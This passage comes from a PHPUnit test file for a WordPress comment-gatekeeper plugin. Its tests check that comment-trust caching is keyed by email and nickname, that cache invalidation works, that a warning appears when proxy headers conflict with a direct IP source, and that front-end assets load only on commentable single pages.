				'判定值来自 (email,nick) 计数而键只有 email 的扁平化面闭合（S6Imp 冒充链——审计 3.6-F2）'
			);
		}

		public function test_p8_same_email_different_nickname_does_not_reuse_cache(): void {
			$calls   = 0;
			$counter = static function () use ( &$calls ): int {
				$calls++;
				return 3;
			};
			$store = array();
			$puts  = array();
			$trust = new CommentTrust(
				array( 'min_approved' => 3, 'credit_cache_minutes' => 5 ),
				$counter,
				static function ( string $key ) use ( &$store ) {
					return array_key_exists( $key, $store ) ? $store[ $key ] : null;
				},
				static function ( string $key, $value, int $ttl ) use ( &$store, &$puts ): void {
					$store[ $key ] = $value;
					$puts[]        = array( 'key' => $key, 'value' => $value, 'ttl' => $ttl );
				},
				static function ( string $key ) use ( &$store ): void {
					unset( $store[ $key ] );
				},
				self::$mac
			);

			$this->assertTrue( $trust->history_pass( array( 'email' => 'ops@example.com', 'author' => '老王' ) ), '真实对预热（计数=3 ≥ N）' );
			$this->assertSame( 1, $calls );
			$this->assertTrue( $trust->history_pass( array( 'email' => 'ops@example.com', 'author' => '老王' ) ), '同昵称第二发=缓存命中（零计数）' );
			$this->assertSame( 1, $calls );
			$this->assertTrue( $trust->history_pass( array( 'email' => 'ops@example.com', 'author' => 'S6Imp' ) ), '同邮箱换昵称=新键重查（5min 窗昵称维不再被缓存吞掉）' );
			$this->assertSame( 2, $calls, '换昵称触发第二次真实 COUNT（审计 3.6 冒充链 B 的实测复现面闭合）' );
		}

		public function test_p8_invalidate_with_author_clears_exact_guest_key(): void {
			$store = array();
			$dels  = array();
			$trust = new CommentTrust(
				array( 'min_approved' => 1, 'credit_cache_minutes' => 5 ),
				static function (): int {
					return 3;
				},
				static function ( string $key ) use ( &$store ) {
					return array_key_exists( $key, $store ) ? $store[ $key ] : null;
				},
				static function ( string $key, $value, int $ttl ) use ( &$store ): void {
					$store[ $key ] = $value;
				},
				static function ( string $key ) use ( &$store, &$dels ): void {
					$dels[]        = $key;
					unset( $store[ $key ] );
				},
				self::$mac
			);
			$trust->history_pass( array( 'email' => 'reader@example.com', 'author' => '老读者' ) );
			$trust->history_pass( array( 'user_id' => 7, 'email' => 'author@site.com' ) );

			$trust->invalidate( 'reader@example.com', 7, '老读者' );

			$this->assertContains(
				'wk_tc_' . substr( (string) ( self::$mac )( 'g:reader@example.com|老读者' ), 0, 16 ),
				$dels,
				'失效钩子按 (email,author) 精确清游客键（Bootstrap 钩子消费 comment_author）'
			);
		}

		public function test_p8_bootstrap_invalidate_hooks_pass_author_source_scan(): void {
			$src = self::src( 'includes/Bootstrap.php' );
			$this->assertStringContainsString( "(string) \$comment->comment_author", $src, 'transition_comment_status/wp_insert_comment 两钩子把 comment_author 传入失效面（昵称维清键材料）' );
		}

		/**
		 * CommentTrust 工厂（内存 store——⑧ 行为级承载；计数注入可编程）。
		 *
		 * @param array<string, string> $store 内存 store（引用）。
		 * @param array<int, array<string, mixed>> $puts 写记录（引用）。
		 * @param callable|null $counter 计数器（null = 恒 3）。
		 * @return CommentTrust
		 */
		private function trust( array &$store, array &$puts, ?callable $counter = null ): CommentTrust {
			return new CommentTrust(
				array( 'min_approved' => 3, 'credit_cache_minutes' => 5 ),
				$counter ?? static function (): int {
					return 3;
				},
				static function ( string $key ) use ( &$store ) {
					return array_key_exists( $key, $store ) ? $store[ $key ] : null;
				},
				static function ( string $key, $value, int $ttl ) use ( &$store, &$puts ): void {
					$store[ $key ] = $value;
					$puts[]        = array( 'key' => $key, 'value' => $value, 'ttl' => $ttl );
				},
				static function ( string $key ) use ( &$store ): void {
					unset( $store[ $key ] );
				},
				self::$mac
			);
		}

		/* ===============================================================
		 * ⑨ P0-E1② CDN 代理头告警黄条
		 * =============================================================== */

		public function test_p9_proxy_header_conflict_matrix(): void {
			$xff  = array( 'HTTP_X_FORWARDED_FOR' => '203.0.113.9' );
			$eo   = array( 'HTTP_EO_CONNECTING_IP' => '203.0.113.9' );
			$cf   = array( 'HTTP_CF_CONNECTING_IP' => '203.0.113.9' );
			$real = array( 'HTTP_X_REAL_IP' => '203.0.113.9' );

			$this->assertTrue( IpResolver::proxy_header_conflict( 'direct', $xff ), 'direct + XFF → 告警' );
			$this->assertTrue( IpResolver::proxy_header_conflict( 'direct', $eo ), 'direct + EO-Connecting-IP → 告警' );
			$this->assertTrue( IpResolver::proxy_header_conflict( 'direct', $cf ), 'direct + CF-Connecting-IP → 告警' );
			$this->assertTrue( IpResolver::proxy_header_conflict( 'direct', $real ), 'direct + X-Real-IP → 告警' );
			$this->assertTrue( IpResolver::proxy_header_conflict( 'direct', array_merge( $xff, $cf ) ), '多头并存恒告警' );
		}

		public function test_p9_proxy_header_conflict_negatives(): void {
			$xff = array( 'HTTP_X_FORWARDED_FOR' => '203.0.113.9' );
			$this->assertFalse( IpResolver::proxy_header_conflict( 'direct', array() ), 'direct + 零代理头 = 无冲突（真直连部署零告警噪音）' );
			$this->assertFalse( IpResolver::proxy_header_conflict( 'direct', array( 'HTTP_X_FORWARDED_FOR' => '' ) ), '空头值不告警' );
			$this->assertFalse( IpResolver::proxy_header_conflict( 'direct', array( 'HTTP_X_FORWARDED_FOR' => '   ' ) ), '纯空白头值不告警' );
			$this->assertFalse( IpResolver::proxy_header_conflict( 'direct', array( 'HTTP_ACCEPT' => 'text/html' ) ), '非代理头不告警（vendor 无关——不写死网段不读非典型头）' );
			$this->assertFalse( IpResolver::proxy_header_conflict( 'xff', $xff ), 'xff 模式下代理头=预期形态零告警' );
			$this->assertFalse( IpResolver::proxy_header_conflict( 'custom_header', $xff ), 'custom_header 模式零告警' );
			$this->assertFalse( IpResolver::proxy_header_conflict( 'traverse', $xff ), 'traverse 模式零告警' );
		}

		public function test_p9_tab4_renders_conflict_yellow_bar_source_scan(): void {
			$src = self::src( 'includes/settings/SettingsPage.php' );
			$this->assertMatchesRegularExpression( '/IpResolver::proxy_header_conflict[\s\S]{0,900}notice_yellow_bar/', $src, 'Tab④ 判定与黄条渲染位相邻（helper 复用——无空接线）' );
			$this->assertStringContainsString( 'wk-iprep-proxy-header-alert', $src, 'Tab④ 黄条 DOM 锚在场' );
			$this->assertStringContainsString( 'per-IP defenses (rate limiting / login thresholds / reputation attribution) may fail entirely', $src, '任务口径文案片段（限流/登录阈/信誉归因失效面）' );
			$this->assertStringContainsString( 'choose an IP source that matches your deployment topology', $src, '任务口径文案片段（处置指引）' );
		}

		public function test_p9_dashboard_widget_renders_conflict_alert_source_scan(): void {
			$src = self::src( 'includes/Bootstrap.php' );
			$this->assertStringContainsString( 'IpResolver::proxy_header_conflict', $src, '仪表盘 Widget 消费同一判定函数（判定单一来源）' );
			$this->assertStringContainsString( 'wk-widget-proxy-header-alert', $src, '仪表盘站务提醒位 DOM 锚在场' );
			$this->assertStringContainsString( 'Proxy forwarding headers detected but the IP source is direct — per-IP defenses (rate limiting / login thresholds / reputation attribution) may fail entirely; choose an IP source that matches your deployment topology in the network settings.', $src, '仪表盘侧文案同口径' );
		}

		public function test_p9_conflict_only_when_direct_mode_constant_guard(): void {
			$this->assertFalse( IpResolver::proxy_header_conflict( 'unknown-mode', array( 'HTTP_X_FORWARDED_FOR' => '1.2.3.4' ) ), '未知模式按非 direct 处理（保守不告警——与 IpResolver 未知取值回落 direct 的解析语义分域：告警面只认显式 direct）' );
		}

		/* ===============================================================
		 * ⑩ P1-8（仅条件件）前台资产条件入队
		 * =============================================================== */

		public function test_p10_front_assets_enqueue_on_comment_page(): void {
			$bootstrap = self::bootstrap_for_front();
			WpFrontAssetStub::$singular      = true;
			WpFrontAssetStub::$comments_open = true;

			$bootstrap->enqueue_front_assets();

			$this->assertContains( 'wink-gatekeeper-front', WpFrontAssetStub::$enqueued_styles, '评论页（可评论单体页）样式仍载' );
			$this->assertContains( 'wink-gatekeeper-front', WpFrontAssetStub::$enqueued_scripts, '评论页调度器脚本仍载' );
		}

		public function test_p10_front_assets_skip_on_non_singular_page(): void {
			$bootstrap = self::bootstrap_for_front();
			WpFrontAssetStub::$singular      = false; // 列表页/首页/搜索页等。
			WpFrontAssetStub::$comments_open = true;

			$bootstrap->enqueue_front_assets();

			$this->assertSame( array(), WpFrontAssetStub::$enqueued_styles, '非文章页零样式（63-66KB 前台足迹收窄——A2-F2）' );
			$this->assertSame( array(), WpFrontAssetStub::$enqueued_scripts, '非文章页零脚本' );
		}

		public function test_p10_front_assets_skip_when_comments_closed(): void {
			$bootstrap = self::bootstrap_for_front();
			WpFrontAssetStub::$singular      = true;
			WpFrontAssetStub::$comments_open = false; // 单体页但评论已关。

			$bootstrap->enqueue_front_assets();

			$this->assertSame( array(), WpFrontAssetStub::$enqueued_styles, '评论关闭页零样式（无评论表单面）' );
			$this->assertSame( array(), WpFrontAssetStub::$enqueued_scripts, '评论关闭页零脚本' );
		}

		public function test_p10_singular_condition_source_scan(): void {
			$src = self::src( 'includes/Bootstrap.php' );
			$this->assertStringContainsString( 'is_singular() && comments_open()', $src, '入队条件两 WP 条件函数组合在场（闸装配判定之后、enqueue 之前）' );
			$this->assertSame( 1, preg_match_all( '/is_singular\(\)/', $src ), 'is_singular 全文件唯一消费位=enqueue_front_assets（登录页资产链不经该条件——回归面）' );
		}

		/**
		 * ⑩ 行为级承载：反射构造 Bootstrap（无构造器——不触 WP 装配），注入前台资产面依赖。
		 *
		 * @return Bootstrap
		 */
		private static function bootstrap_for_front(): Bootstrap {
			$ref  = new \ReflectionClass( Bootstrap::class );
			$obj  = $ref->newInstanceWithoutConstructor();

			$base = $ref->getProperty( 'base_url' );
			$base->setAccessible( true );
			$base->setValue( $obj, 'http://example.test/wp-content/plugins/wink-wp-gatekeeper/' );

			$precheck = $ref->getProperty( 'precheck_config' );
			$precheck->setAccessible( true );
			$precheck->setValue( $obj, null );

			$gate = $ref->getProperty( 'comment_gate' );
			$gate->setAccessible( true );
			$gate->setValue( $obj, new CommentGate( array() ) ); // captcha=null → 驱动适配器入队自然跳过。

			return $obj;
		}
	}
}
